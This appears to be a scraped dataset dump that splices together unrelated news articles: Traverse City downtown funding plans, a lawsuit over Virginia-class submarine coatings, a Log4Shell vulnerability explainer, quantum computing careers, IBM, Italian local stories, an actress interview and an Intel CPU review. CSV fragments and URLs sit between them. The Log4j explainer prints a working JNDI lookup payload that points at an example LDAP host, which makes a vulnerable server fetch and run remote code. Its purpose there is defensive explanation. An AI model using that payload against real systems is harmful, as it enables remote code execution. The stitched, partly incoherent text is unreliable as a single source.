Tackling Rotary Square and the alleys could put the DDA right in the $15 million range for TIF 97 projects according to cost estimates provided by Derenzy. Board members agreed Friday on pursuing a potential bonding plan for those projects as the best path forward; the DDA board and city commission would still need to officially vote in the future to authorize a bonding plan. Prioritizing Rotary Square and the alleys leaves several other projects on the table however notably a long-planned third public parking deck on West Front Street. At a conservative estimated cost of $22 million for the deck Derenzy said there was no way to tackle the project within the current TIF 97 plan. However if the city were to extend TIF 97 beyond 2028 – something it can do unilaterally despite opposition from other local taxing jurisdictions who are set to receive revenues being captured now once the plan expires – it could finish projects like the deck Derenzy said.

DDA board members signaled support for pursuing an extension of TIF 97 to pay for the parking deck as well as an estimated $12 million in Boardman River preservation improvement and recreational projects outlined in the Lower Boardman River Unified Plan. Board Vice Chair Scott Hardy said west side development was being hindered by a lack of a deck adding that if one were to be built it could spur more investment that would ultimately create more TIF 97 revenue. However “there just aren’t that many people who are going to invest on a wing and a prayer” he said. “There is solid urgency to defining what we’re doing on the west end of town with a west end parking deck.”

Hardy also said that while taxing jurisdictions might be unhappy about TIF 97 being extended beyond its promised 30 years the purpose of the plan was to accomplish the projects described within it which includes a third parking peck. “The TIF plan is a long way from being complete” he said. Derenzy also noted that TIF capture is the only legal cost-sharing model in the state of Michigan that ensures infrastructure expenses are spread across the entire region which benefits from having a thriving downtown hub. “It’s not fair for Traverse City residents to shoulder the whole burden of infrastructure” she said. “This is the only mechanism we have (to spread out costs).” If TIF 97 is extended and a deck is included as part of that plan it could still be close to a decade before it’s built. In that scenario Derenzy said she would urge city leaders to slow down their plans to redevelop surface parking lots into mixed-used developments in order to preserve downtown parking until replacement spots are available in the deck.

Friday’s meeting raised existential questions DDA board members will have to tackle about other key projects. After going through an extensive public input process this year to create a new design for East Front Street – originally intended to be reconstructed next year – Derenzy is now recommending putting the project off after the final design was criticized by both residents and business owners. Business owners also told Derenzy they already ordered inventory for spring/summer 2022 and couldn’t afford to have the street shut down next year. The planned reconstruction of Grandview Parkway in 2023 means 2024 is now the soonest East Front could be tackled. DDA board members did not identify the project as a priority for TIF 97 funding which could delay the timeline even further but Derenzy said it was possible to pursue other funding sources outside of TIF for the street reconstruction.

The Sara Hardy Downtown Farmers Market – which has long been targeted for a redesign and the creation of a permanent market structure – also failed to generate interest as a funding priority Friday. Hardy said the lack of enthusiasm among board members for the market as a priority raises questions about whether “the DDA should be in charge of the farmers market in the first place.” He added: “Are we the legitimate group that ought to be maintaining and operating that?” Derenzy acknowledged that it wasn’t clear whether downtown parking Lot B is the right permanent home for the farmers market a crucial question the DDA will need to answer going forward.

Despite many unknowns still lingering over downtown projects DDA board members expressed satisfaction Friday with having a clearer sense of the work they want to tackle over the next six years as well as a possible goal of pursuing a TIF 97 extension. “We actually have some hard costs that we can move forward with” Derenzy said. “It’s a plan to be able to implement.”",,,,,,,,,,,,
HII,Huntington Ingalls Industries,https://news.google.com/articles/CBMiZ2h0dHBzOi8vbmF0aW9uYWxpbnRlcmVzdC5vcmcvYmxvZy9yZWJvb3Qvd2hhdHMtY2F1c2luZy11cy1zdWJtYXJpbmVzLWxvc2UtdGhlaXItc3RlYWx0aC1jb2F0aW5ncy0xOTc3NTbSAQA?hl=en-US&gl=US&ceid=US%3Aen,What's Causing U.S. Submarines To Lose Their Stealth Coatings?,"The issue is going all the way to federal court.

Here's What You Need to Remember: It was apparent more than a decade ago that the Virginia’s coatings were peeling off during operations.

Aformer employee of Huntington Ingalls Industries the Virginia-based shipbuilder that helps to construct all of the U.S. Navy’s submarines has sued the company in federal court claiming that the firm lied about problems with the external coating on Virginia-class attack subs.

Ari Lawrence a former HII engineer claimed he was fired for raising his concerns about the “anechoic” hull coating which adheres to a submarine’s metal hull and helps to absorb sound waves thus minimizing the vessel’s sonar signature.

Virginia-class subs since at least 2006 have suffered problems with their coatings. Official photos have depicted submarines entering and leaving port with noticeable gaps in their coatings implying that chunks of the sound-absorbing material had peeled off.

Lawrence claimed HII falsified testing inspection results and certifications related to the coatings.

The company will vigorously fight the charges Jennifer Boykin president of HII’s Newport News Shipbuilding division told the Hampton Roads Daily Press newspaper. She told Daily Press that the U.S. Justice Department looked at Lawrence’s claims and declined to join the case.

Naval consultant Craig Hooper weighed in with comments to Daily Press. “It’s one of these things where it seems deceptively simple” Hooper said of the coatings. “But it has a lot of variables.”

Losing sound-absorbing materials is a common problem for operators of deep-diving submarines Forbes reported. “Submarines are made out of immensely strong steel but when they go deep the water pressure makes their hulls flex and change shape.”

This places the adhesive behind the coating under immense strains. Add to this the long patrols unforgiving salt water rust and temperature changes involved and you have one of the most challenging operating environments on earth. So when you next see a submarine with tiles missing and rust stains it may tell you more about the way it is being used than the maintenance standards of its owners. Some British submarines suffer similar problems. The Russian navy is often slow to replace tiles that have fallen off. Some Russian submarines such as the Sierra-class attack boats have titanium hulls which seems to make the problem even worse. Sierra-class vessels have been sailing around for years with the same patches of missing tiles on the outside. These patches are so reliable that they can be used to identify the individual submarine. But spare a moment for the submariners of the Iranian navy. When Iran imported Kilo-class submarines from Russia in the 1990s they came with an anechoic covering. Iran’s drive for self-sufficiency has resulted in the submarines being maintained locally. Evidently the shipbuilding industry has a challenge reproducing the rubber tiles. They are often seen sailing around with most of the tiles removed leaving a very uneven surface. This may actually increase the noise signature of the submarine.

Where older submarines have brick-like sound-absorbing anechoic tiles Virginia-class subs feature a coating that shipyard workers apply in large sections. “It creates a smoother surface and was thought to be cheaper faster and more durable” Daily Press explained.

But it was apparent more than a decade ago that the Virginia’s coatings were peeling off during operations. The Virginias are on track to become the most numerous type of submarine in the U.S. Navy’s roughly 50-strong undersea fleet.

Lawrence claimed the shipbuilder lied to cover up the flaws in the Virginias’ coatings. The cover-up endangers American sailors’ lives Lawrence asserted.

Hooper took a sanguine view. “As it has been explained to me the failure of anechoic coating is not the end of the world — one can operate at slower speeds to reduce banging or flapping” he said.

But in a major war with Russia or China American subs would need every advantage they can get Hooper added. And the Navy and HII have had plenty of time to fix the problem.

“If this issue was detected in 2006 [or] ‘07 it’s been more than a decade” Hooper said. “We have sunk billions into the Virginia class and it is high time the Virginia-class subs met or exceeded their original performance objectives.

New vulnerability in 2.17 — CVE-2021-44832

Upgrade to 2.17.1 to mitigate this vulnerability

Do NOT enable JNDI in any versions

Follow: https://logging.apache.org/log4j/2.x/security.html

If you hadn’t heard of Apache Log4j chances are it’s on your radar now. In fact you may have been using it for years. Log4j is a logging library. Imagine writing your daily activities into a notebook. That notebook is Log4j. Developers and programmers use it to take notes about what’s happening on applications and servers. For example they may use it to troubleshoot a security incident like if someone were to log into an application with the wrong password. Log4j might be used to record when the person logged in to which application and the password they used.

Log4j is used by a very large percentage of the Java programs developed in the last decade for both server and client applications. Java is also one of the top programming languages used by businesses. That’s why on December 9 2021 when Chen Zhaojun of the Alibaba Cloud Security Team discovered CVE-2021-44228 a.k.a. Log4Shell a high-severity vulnerability that affects the core function of Log4j and a publicly available exploit cybersecurity researchers sounded the alarm.

CVE 2021-44228 enables attackers to perform remote code execution which means they can run any code and access all data on the affected machine. It also allows them to delete or encrypt files and hold them for ransom. Any function the impacted asset can do attackers can do as well with the exploit. This means anything that uses a vulnerable version of Log4j to log user-controlled data can be attacked.

A Technical Dive into CVE-2021-44228

Log4j allows logged messages to contain format strings that reference outside information through the Java Naming and Directory Interface (JNDI). This allows information to be remotely retrieved across a variety of protocols including the Lightweight Directory Access Protocol (LDAP). For example when Log4j finds the following string in a log message it instructs the JNDI to ask the LDAP server at 192.168.1.1 for the “information” object.

${jndi:ldap://192.168.1.1/information}

By design JNDI will execute Java classes that an LDAP server references. Continuing the example if the LDAP server’s response references the URL http://192.168.1.2/information JNDI will automatically request the file information.class from the web server and execute the response.

Since the contents of log messages often contain user-controlled data attackers can insert JNDI references pointing to LDAP servers they control ready to serve malicious Java classes that perform any action they choose.

What’s to Come for CVE-2021-44228 and other recently disclosed vulnerabilities?

We have seen reports of attackers exploiting CVE-2021-44228 which doesn’t surprise us. Criminals will find this to be a very appealing attack technique because Log4j is popular programs often include user-supplied data in logs and the patch was only recently released. We expect more attacks — ransomware and others — to take place in the future.

Patching a single application isn’t too complicated but each application needs to be tested to verify that the patch didn’t break anything. Large organizations could easily have hundreds of vulnerable applications across thousands of devices.

Apache Releases Another New Patch

(Source: https://logging.apache.org/log4j/2.x/security.html)

Patching is the number one recommended mitigation step. Apache recently released 2.17.1 after a remote code execution vulnerability was found in 2.17. You must upgrade to 2.17.1 to mitigate this vulnerability. The CVSS score on CVE-2021-44832 is 6.6 and rated as moderate. An attacker must have privileged access to execute an attack. Apache’s mitigation recommendations include:

Upgrade to Log4j 2.3.2 (for Java 6) 2.12.4 (for Java 7) or 2.17.1 (for Java 8 and later).

In prior releases confirm that if the JDBC Appender is being used it is not configured to use any protocol other than Java.

Note that only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted by this vulnerability. Also note that Apache Log4j is the only Logging Services subproject affected by this vulnerability. Other projects like Log4net and Log4cxx are not impacted by this.

Users are advised not to enable JNDI in any versions of Log4j.

Previously suggested mitigations other than patching Log4j or removing the JNDI Lookup feature entirely DO NOT mitigate this vulnerability.

On the preventative front designing an environment with strong network security controls can help. In well-designed environments for example servers can only create network connections to explicitly approved destinations. Creating a default-deny firewall rule will prevent servers from creating unapproved connections and can help reduce your risk of a compromise. This is particularly important for servers that are exposed to the internet.

Quantum Computing can solve complex optimisation issues process information faster than conventional computers counter cybercrime and help us to effortlessly embrace Machine Learning AI (Artificial Intelligence) and Cloud Computing. Its impact on defence healthcare banking among many other industries will also be momentous.

In 2020 a Harvard Business Review article by quantum physicist Shohini Ghose stated that quantum physics has already changed our lives with inventions of the laser and the transistor and almost every electronic device that we use today. Quantum Computing is especially needed in the post-pandemic world to galvanise drug development sort large volumes of data whether we are researching climate change exploring space managing large organisations trying to simplify supply chain complications or just trying to forecast weather. Quantum information is also hard to copy and would defy hackers from accessing sensitive communications .

Who can learn?

Anyone with B.E. B.Tech or equivalent degree in an engineering discipline can progress to quantum computing. An understanding of linear algebra complex numbers Python skills machine learning classical software development is a good start and there are many good online resources also to hone your skills.

Career prospects

With the Government announcing the ‘National Mission on Quantum Technologies and Applications’ in 2020 and promising a financial support of ₹8000 crore over a span of five years there is an urgent need for trained professionals in the field. A trained workforce can pursue a career in MNCs like IBM and Google academics government research labs in data security and defence spaces as well as fields that require scenario simulation.

There are many instructor-led online training modules in India. In June this year IIT-Madras and IBM invited applications for a free online course on Quantum Computing on the NPTEL platform. To amplify research IBM’s Quantum Educator Programme will be accessible to faculty and students of Indian Institute of Science Bangalore IIT-Kanpur IIT-Kharagpur IIT-Jodhpur Indian Institute of Science Education & Research Pune and Thiruvananthapuram Indian Statistical Institute Kolkata Indraprastha Institute of Information Technology Delhi Tata Institute of Fundamental Research Mumbai and the University of Calcutta.

The BFSI sector

Quantum Computing can revolutionise the Banking financial services and insurance (BFSI) sector. It can cut costs manage a large workforce systemise work flow and offer multiple simulation options. It can also enhance cybersecurity protect financial data streamline securities pricing and assess risks and challenges yet to come via statistical probabilities. Encryption-based skills will also serve capital markets and corporate finance.

Financial institutions have to harness quantum computing in order to analyse large unstructured data with more competence to gain better and quicker insights on improving their way of functioning. Be it customer service processing mortgage requests reading capital markets unravelling corporate finance sorting portfolio management or staying abreast of encryption-related activities quantum computing can be a real asset. Quantum computers can sift live data streams in real-time address financial problems make calculations that reveal arbitrage possibilities employ behavioural data to improve customer engagement and to quickly respond to the shifts in the market.

As you already know that the age of IBM is more than the age of many countries but do you know that IBM works in about 175 countries of the world? Last year IBM’s revenue was about $75 billion. Now you must be thinking that almost the entire part of this revenue will come from IBM’s technology but it is not so about a third of it i.e. $25 billion comes only from IBM cloud service.

In recent days it has come to the news that IBM is going to split into two big companies. If something like this happens then we will definitely inform you. Stay tuned with us to stay connected with the life of a celebrity.

la fontana di piazza De Ferrari si colorerà di verde.

Il Comune di Genova aderisce così alla proposta dell'associazione Penelope che dà sostegno e supporto alle famiglie e agli amici delle persone scomparse illuminando con il colore simbolo dell'iniziativa uno dei luoghi più rappresentativi della città.

L'Associazione Penelope fornisce sostegno psicologico e legale alle famiglie e agli amici degli scomparsi rompendo il muro di silenzio e indifferenza che regna attorno a questo delicato fenomeno che purtroppo non accenna a rallentare e che rappresenta una sfida importante per la nostra società.",https://news.google.com/articles/CBMiZGh0dHBzOi8vcHJpbWFsYXZhbHRlbGxpbmEuaXQvYXR0dWFsaXRhL2xhLW1hZ2lhLWRlbC1uYXRhbGUtaWxsdW1pbmEtaS1wYWxhenppLWRlbC1jZW50cm8tZGktc29uZHJpby_SAQA?hl=en-US&gl=US&ceid=US%3Aen,La magia del Natale illumina i palazzi del centro di Sondrio,,https://news.google.com/articles/CBMiZ2h0dHBzOi8vd3d3LmNyZW1hb25saW5lLml0L3J1YnJpY2hlLzExLTEyLTIwMjFfUGFudGVsJUMzJUI5LCtnbGkrYWl1dGFudGkrZGkrQmFiYm8rTmF0YWxlK2luK3BlZGlhdHJpYS_SAQA?hl=en-US&gl=US&ceid=US%3Aen,La bontà dei Pantelù illumina le festività natalizie: 'vogliamo strappare sorrisi a tutti',"A Crema è già Natale. Non solo per le fantastiche luminarie allestite nelle vie del centro ma soprattutto perché vi capiterà non di rado di incontrare gli aiutanti di Babbo Natale. Fidi compagni ogni anno presenza costante sempre prossima alle persone e alle famiglie bisognose. Sono i Pantelù guidati da Renato Stanghellini. Stamattina sono stati immortalati nel reparto di pediatria del Maggiore di Crema intenti a consegnare doni ai bimbi in occasione di santa Lucia. La folta barba del Babbo non è bastata a nascondere i sorrisi. Gli occhi che brillavano poi hanno fatto il resto davanti ai tanti dolci donati. “Siamo riusciti ad accedere al reparto dopo tanto tempo. Abbiamo consegnato i doni ad alcuni bambini ed è stato bellissimo. Anche Babbo Natale si è emozionato. Lo sguardo di un piccolo pieno di stupore e di felicità lascia il segno più di qualunque altra cosa” ammette Stanghellini. È questa la magia delle festività natalizie. E' questa la bellezza che i Pantelù sanno creare in ogni luogo. Anche negli angoli. Ché dove ci sono loro c'è sempre un sorriso.

La solidarietà corre

E loro nei giorni prima di Natale sono sempre in giro. In centro in ospedale nelle case delle persone sole. “Domani mattina saremo in centro a distribuire caramelle”. Loro ci sono sempre. C'erano la scorsa settimana all'accensione del Giorgione con mascherine rigorosamente rosse perché “richiamano l'aria natalizia”. C'erano domenica scorsa insieme agli zampognari del gruppo tradizionale Antichi suoni di Bergamo. “Durante la settimana siamo stati impegnati nei preparativi” . Il tavolo della sede presso il circolo Arci di san Bernardino era colmo di caramelle e dolcetti. Il camioncino giallo simbolo dei Pantelù carico di pacchi per gli anziani soli. “Abbiamo voluto cominciare in anticipo con le consegne ma alcuni di loro non sono in casa. Ripasseremo”. In anticipo sulla tabella di marcia l'intento resta sempre lo stesso di ogni anno: portare a spasso la solidarietà e donare sorrisi.

Una Santa Lucia speciale

Sono 54 i destinatari individuati dal servizio sociale del Comune di Crema che riceveranno i pacchi regalo preparati dalla Conad di Offanengo. Tantissime le persone con disabilità con cui il gruppo cremasco dal grande cuore scambierà quattro chiacchiere davanti ad una pizza. “Questi saranno gli impegni dei prossimi giorni e del giorno di Santa Lucia. Lunedì saremo alla pizzeria Mezzo con i bambini con disabilità e ovviamente faremo tappa a Casa Anffas”. Insomma fermi i Pantelù non sanno proprio stare. Ed è un bene che i sorrisi (pur celati dalla mascherina) e la solidarietà restino in circolo. Fanno bene a tutti: rendono Crema ed i cremaschi ancor più accoglienti. Ché a Crema è Natale anche grazie ai Pantelù. “Non ci fermiamo continueremo fino alla Befana”. Proseguirà fino all'Epifania “che tutte le feste porta via” anche la raccolta fondi ai piedi del Giorgione per MagicaMusica.",https://news.google.com/articles/CBMiTmh0dHBzOi8vd3d3LmVsbGUuY29tL2l0L21hZ2F6aW5lL2ludGVydmlzdGUvYTM4NDExNTk1L21pcmlhbS1sZW9uZS1pbnRlcnZpc3RhL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Miriam Leone intervista: l'attrice parla di Eva Kant e felicità,"L’appuntamento è alla Pinacoteca di Brera a Milano. Mentre attendo sotto il portico cerco il volto di Miriam Leone tra i turisti e gli studenti di Belle Arti che sciamano all’ombra della statua di Napoleone nudo e olimpicamente indifferente al brumoso novembre milanese. Da qualche parte molto vicino anche Miriam aspetta: il suo sguardo indugia e fantastica come d’abitudine sulle persone che ha intorno. Si fa qualche domanda anche sul mio conto confesserà poi davanti a un caffè la donna bassina che all’improvviso si sbraccia per attirare la sua attenzione. Provvisoriamente biondissima come Eva Kant l’eroina dei fumetti a cui dà corpo e sguardi fatali in Diabolik il film dei Manetti Bros. che il 15 dicembre debutta in anteprima assoluta al Noir in Festival e il 16 arriva nelle sale con l’impeccabile chignon per una volta sciolto come un’aura elettrica intorno al viso mi chiedo come si possa comprimere la sua presenza esuberante e fosforica nelle due dimensioni di un fumetto in bianco e nero.

Deve leggermelo in faccia perché a partire dal nostro incontro si adopererà con entusiasmo perché riesca a vedere il film prima di scrivere e forse constatare da me la vis istrionica profusa a confronto della quale e non è spoiler il trasformismo di Eva Kant con le sue mille maschere impallidisce. ""È stata una metamorfosi estrema per me"" ammette quando ci rifugiamo nel Caffè della Pinacoteca ""ma necessaria: sono fiera e grata di essermi donata a Eva a partire dai capelli. Val la pena di tenersi qualche doppia punta in più per interpretare uno dei più bei personaggi femminili di sempre. E vivere nel linguaggio nelle ispirazioni nello stile dei favolosi anni Sessanta"".

Laura Sciacovelli Poliedrica l’attività di Miriam Leone 36 anni attrice  modella e volto di L’Oréal Paris. In questa foto indossa al contrario un trench oversize con logo monogram Dior come i calzini.

L’ha frequentata ha indossato il suo strepitoso guardaroba sciolga l’enigma: chi è Eva Kant?

È la prima donna colei che salva Diabolik non solo in senso angelico-cavalleresco ma anche in maniera pragmatica e sostanziale. È un archetipo eppure è reale concreta. Attraverso Eva entriamo in Diabolik non è un suo satellite ma un pianeta con la sua traiettoria: e lo ama davvero.

Laura Sciacovelli Nata a Catania Miriam Leone ora vive a Milano col marito Paolo Carullo. In questa foto indossa un bolero con ricami allover e pantaloni di nappa Isabel Marant.

È una lady di gran classe e una moglie amorevole una spietata vendicatrice e una ladra innamorata del bello. Arriva a Clerville con tutti i suoi bagagli (e ringrazio Fendi per avermi prestato bauli originali della stessa epoca autentici pezzi da museo) vedova di un marito che ha cercato di farla fuori e ça va sans dire ha avuto la peggio.

E il Diabolik di Luca Marinelli com’è?

È stato un piacere lavorare con Luca. Assieme a lui a Valerio Mastandrea (l’ispettore Ginko) e ai Manetti Bros. ci siamo ritrovati con audacia e incoscienza a rendere tridimensionali personaggi stampati in bianco e nero sulla carta. I giudici più severi saranno i fan del fumetto.

“Le sorelle Giussani con Eva Kant hanno precorso i tempi immaginando un'eroina femminista prima del '68: nel rappresentarla abbiamo cercato di non tradire la loro volontà""

Innamorati della prima ora di quest’eroina che ruba la scena al protagonista.

Nel rappresentarla abbiamo cercato di non tradire la volontà delle due donne che l’hanno creata Angela Giussani e sua sorella Luciana a cui ho dedicato tutto il mio lavoro. Il marito di Angela aveva una casa editrice l’Astoria. Lei ex modella una delle prime donne a ottenere il brevetto di volo cominciò a immaginare le avventure di Diabolik nel tinello di casa assieme alla sorella. Lì fondò l’Astorina casa editrice che ancora resiste. Ringrazio anzi Mario Gomboli l’attuale direttore al fianco delle sorelle dal 1966 per le cose belle che ha detto sulla mia interpretazione. Un pensiero va anche alla memoria di Enzo Facciolo che ha disegnato Eva regalandole l’eleganza e la grinta rivoluzionaria delle sorelle Giussani che hanno precorso i tempi immaginando un’eroina femminista prima del '68.

Che ha la prestanza di un uomo: come ha fatto?

È stato il mio preparatore atletico a illuminarmi: “Ti hanno sempre detto che non ti puoi difendere perché sei donna” mi ha spiegato “ma ti devi convincere che tu con un pugno potresti spaccare una mascella”. Il lavoro su Eva Kant ha liberato una parte di me... piuttosto pericolosa (ride).



Come funzionano sullo schermo i dialoghi asciutti del fumetto?

Bene. Lo spazio qui è tutto per gli sguardi la fisicità. Ammetto però che pronunciare senza un sussulto certe battute così esclamative è stata un’impresa. Provi lei a dire senza ridere: “Dammi la Scopolamina! “il Pentothal!”. E poi la mia preferita: “Mogliettina un corno!”».

Su quale alchimia si regge il rapporto tra Eva e Diabolik?

Sono lo Yin e lo Yang il bianco e nero il cerchio perfetto: ciascuno dei due mescola in sé quote di maschile e di femminile una punta di bene o di male. Insieme sono ciò che resta dopo l’ultima riga delle favole: non si lasceranno mai.

Eppure nel chiuso del loro rifugio sembrano condividere un ménage ordinario.

Al netto dell’adrenalina dei colpi sembrano un po’ Sandra e Raimondo: la colazione con il giornale i battibecchi. Una coppia borghese. Ma solo dentro casa possono essere se stessi fuori indossano sempre una maschera. Solo Eva Kant conosce il vero volto di Diabolik.

E non è questa l’intimità fuor di metafora?

Certo: solo chi ci ama ci vede davvero per come siamo.

Questa storia delle maschere da attrice le suonerà familiare.

A me come a tutti: è il famoso Uno nessuno e centomila pirandelliano. Ma io non ho una vita straordinaria come Diabolik.

Se ne rammarica?

Nessun rammarico sono fortunata: posso scegliere su cosa e quanto lavorare. Però ci sono momenti come ora in cui non vorrei ripartire. Sono stata lontana più di due settimane e mi sono appena sposata. Non mi fanno paura i sacrifici rispetto i contratti ho un gran senso del dovere. Ma non voglio che questo mestiere mi divori la vita o non abbiamo imparato niente dalla pandemia.

Cosa avremmo dovuto imparare?

Che la felicità è una conquista si compie attraverso le scelte e ha bisogno di cure: quando t’illumina devi imparare a godertela. Che il mondo del lavoro dovrebbe iniziare a contemplare il tempo per l’amore la famiglia la cura di sé e l’esistenza anche quella degli artisti ha senso se la realizzazione professionale e quella umana sono in equilibrio. Come può una madre lavorare a certi ritmi e permettersi di amare un figlio senza farlo crescere ad altri? Sono domande che tante donne si pongono. Bisognerebbe sostenerle di più.

Il tema della conciliazione è finalmente approdato sui set?

Se ne comincia a parlare e c’è ancora tanta strada da fare ma credo che l’individualismo sfrenato degli ultimi anni stia cedendo il passo a uno stile di vita più consapevole e con meno sensi di colpa per il tempo dedicato alle attività dell’animo.

È popolare e apprezzata ha appena vinto un Nastro d’argento è soddisfatta di sé?

Ci sto lavorando: mi sembra sempre tutto transitorio e migliorabile. Però dopo questa pandemia in cui grazie al cielo la mia famiglia ha avuto fortuna ho imparato a guardare il mondo con occhi diversi. Quando è scattato il lockdown eravamo ospiti di amici in Toscana: siamo partiti per il weekend e siamo rimasti loro ospiti tutto il periodo con me avevo solo due paia di slip.

Quel che si dice l’essenziale.



Come quando da piccola preparavo lo zaino per gli scout avevo un foglio con i disegni che indicavano il necessario: l’intimo le calze un paio di pantaloni un maglione. In una bacinella la sera mettevo a mollo gli indumenti per l’indomani. Dopo le prime due settimane di paura mi sono rilassata e mi sono dedicata ad attività nuove: andare a cavallo sellarlo pulire la stalla.

ph. Davide Pippo Miriam Leone in una scena di Diabolik.

Un’altra lezione della pandemia?

Sempre la stessa: ho capito che non sono soltanto quello che faccio ho fatto un respiro profondo e sono ripartita con il giusto distacco mi sono presa anche il tempo per organizzare un matrimonio.

“Con pochi vestiti e la ricrescita in testa durante il lockdown abbiamo raggiunto l'essenza del nostro rapporto”

Soli e senza maschere come Diabolik ed Eva: è stato allora che avete deciso di sposarvi?

Senza maschere e senza la loro adrenalina. Con pochi indumenti e la ricrescita in testa abbiamo raggiunto l’essenza del rapporto. Ci siamo guardati e quasi non c’è stato bisogno di dirlo.

Il matrimonio lo abbiamo seguito sui social. E il viaggio di nozze?



Per ora lo stiamo sognando. Domani lascio di nuovo Milano mi aspettano Diabolik 2 e 3.

Come vive una catanese a Milano?

Bene qui ci sono la mia casa la mia famiglia mi sto facendo nuovi amici ho già due paia di friulane e le ortensie stabilizzate (ride). E se a Milano ho trovato un posto in cui fiorire è perché porto sempre a innaffiare le mie radici nella mia terra magica e vulcanica.

Alder Lake's arrival heralded the opening salvo of Intel's brutal price war on AMD's Ryzen 5000 chips and the Core i7-12700K is the perfect example of Intel's new bare-knuckle approach to pricing. At $409 the 12700K thoroughly beats the $390 Ryzen 7 5800X and even unseats the pricey $550 Ryzen 9 5900X all while delivering essentially the same gaming performance as the fastest gaming chip on the planet Intel's own $589 flagship Core i9-12900K — but for $180 less. Alder Lake also provides the biggest gains in overclocking performance that we've seen in the last several chip generations. As a result the Core i7-12700K joins our list of the best CPUs for gaming. It's also exceedingly competitive in applications assuring a top ranking in our CPU Benchmark hierarchy.



The 12700K comes on the heels of Intel's other surprising victories against much pricier chips like the $589 Core i9-12900K vs $799 Ryzen 9 5950X and the $289 Core i5-12600K vs $390 Ryzen 7 5800X (click the links for the full rundown) proving that Alder Lake truly punches above its pricing weight class.



Surprisingly the majority of these gains come even without the advantages of Alder Lake's new next-gen connectivity technologies that bring big increases in throughput via DDR5 memory and PCIe 5.0 interfaces. You can use standard DDR4 memory and PCIe devices to unlock superior performance over AMD's aging AM4 platform but DDR5 will give you an extra performance kicker in some applications. Intel's platform is also prepared for the inevitable transition to PCIe 5.0 but that brings higher motherboard pricing. That reduces (but doesn't eliminate) Intel's chip pricing advantage at least until B- and H-series boards arrive in the coming months.



Intel is the first to support DDR5 and PCIe 5.0 on the desktop and the company combines that tech with another first for desktop PCs — Alder's new hybrid x86 design represents the company's most disruptive architectural shift in a decade. Alder Lake combines big and fast Performance cores (P-cores) with clusters of small and powerful Efficiency cores (E-cores) that chew through background processes. The Golden Cove architecture powers the 'big' P-cores while the 'little' E-cores come with the Gracemont architecture with both providing much-needed IPC improvements to Intel's core designs.



The 'Intel 7' process debuts with Alder Lake finally ending Intel's misery on the 14nm node after six long years that ultimately cost the company its performance crown to AMD. We previously knew this 'Intel 7' manufacturing tech as 10nm Enhanced SuperFin but Intel recently renamed its process nodes to match industry nomenclature. Technically this is the second generation of Intel's 10nm process but it's a first for desktop PCs.

For now Alder Lake consists of three high-end overclockable K-series models along with their graphics-less KF counterparts that are slightly less expensive with more models to come in the future. The P-cores are hyper-threaded while the E-cores only have a single thread leading to what we would normally consider as non-standard thread counts. The Core i7-12700K comes with eight P-cores and 4 E-cores for a total of 20 threads slotting in between the 16-core 24-thread Core i9-12900K and the 10-core 16-thread Core i5-12600K.



There is a catch though. Alder Lake's new heterogeneous design requires special accommodations to unlock the best performance: Performance-sensitive work executes best on the P-cores while the E-cores are best for background and threaded workloads but ensuring that the right workloads land on the correct cores requires operating system intervention.



The Alder Lake chips work with both newer and older versions of Windows but Windows 11 unlocks the best performance because it supports Intel's new Thread Director. The tech provides the operating system with information that assists in assigning work to the correct cores. Alder Lake's performance is still competitive in Windows 10 but you might encounter wayward performance and/or variability meaning some workloads will be slower at times due to unoptimized thread scheduling. However you can rectify those issues in Windows 10 with various utilities like the always-popular Process Lasso.



Conversely Alder Lake is incredibly impressive in Windows 11 and takes the lead over AMD in gaming and most workloads and by large margins. In other words for worry-free class-leading performance go with Windows 11 and Alder Lake. You'll get similarly impressive performance with Windows 10 but it will require a bit more manual intervention in a few applications.



Intel's previous-gen Rocket Lake chips came with the same number of cores for both the Core i7 and i9 models leaving little difference between the two models. However the Core i7 12700K has four fewer E-cores than the Core i9-12900K and a 200 MHz lower boost clock marking the return of meaningful segmentation between the Core i7 and i9 lineups.



That segmentation is apparent in lightly- and heavily-threaded productivity applications with the 12900K earning its higher price tag in those areas. But as you'll see in our benchmarks below the 12700K offers essentially the same performance in gaming making it the new high-end champion for performance addicts while the Core i5-12600K remains the best mid-range CPU for gaming. Speaking of the performance-obsessed we've also included in-depth overclocking testing which unearthed the biggest gains we've seen from recent Intel chips — we certainly haven't seen double-digit percentage increases in gaming performance from overclocking in several chip generations.

Intel Alder Lake-S Core i7-12700K Specifications and Pricing

Intel is only bringing its most expensive chips from the Core i9 i7 and i5 families to the retail market for now but it is also shipping 28 more models to OEMs for prebuilt systems that arrive early next year. Intel isn't sharing details yet but those models will eventually come to retail at an unspecified time.



We have deep-dive coverage of the Alder Lake SoC design and core microarchitectures here along with a broader overview in our Alder Lake all we know article. Additionally Intel has removed its 'TDP' (Thermal Design Point) nomenclature from the spec sheets and now assigns a Processor Base Power (PBP) value in its place. The company also added a secondary Maximum Turbo Power (MTP) value to the spec sheets to represent the highest power level during boost activity. You can read more about that change here.

All Alder Lake chips support DDR4-3200 or up to DDR5-4800 memory but caveats apply. Alder Lake chips expose up to 16 lanes of PCIe 5.0 (technically for storage and graphics only no networking devices) and an additional four lanes of PCIe 4.0 from the chip for M.2 storage.



The Core i7-12700K lands with the same $409 pricing as the previous-gen Core i7-11700K but it comes with 33% more threads. The Core i7-12700K has eight P-cores and four E-cores for a total of 20 threads. The P-cores run at a 3.6 / 5.0 GHz base/boost but that isn't too important given the entirely new hybrid architecture — the P-cores process roughly 19% more instructions per cycle and the SoC realizes performance gains from using different core types for different tasks. Meanwhile the E-cores weigh in at 2.7 / 3.8 GHz. The chip is fed by 25MB of L3 cache and 12MB of L2.



Based on price alone the 12700K competes with the Ryzen 7 5800X. The 5800X carries a $449 suggested price tag but is commonly found for about $390 at retail. The Ryzen 7 5800X comes with eight cores and 16 threads that are easily outweighed by the 12700K's hybrid architecture with 20 threads. This chip has a 3.8 / 4.7 GHz base/boost clock but that isn't directly comparable to the 12700K given the different architectures in play.



Based on performance the Ryzen 9 5900X is more of a natural competitor for the 12700K. The $549 Ryzen 9 5900X comes with 12 cores and 24 threads that run at a 3.7 / 4.8 GHz base/boost clock. Both competing Ryzen chips have a 105W TDP.



In contrast the 12700K comes with a 125W PBP (base) and 190W MTP (peak) power rating but be aware that Intel has also changed its default boost duration for all K-series chips from the 56-second duration with Rocket Lake to an unlimited value. This means the chip will effectively always operate at the 190W MTP when it is under load. However most enthusiast motherboards will effectively lift all of the power limits.



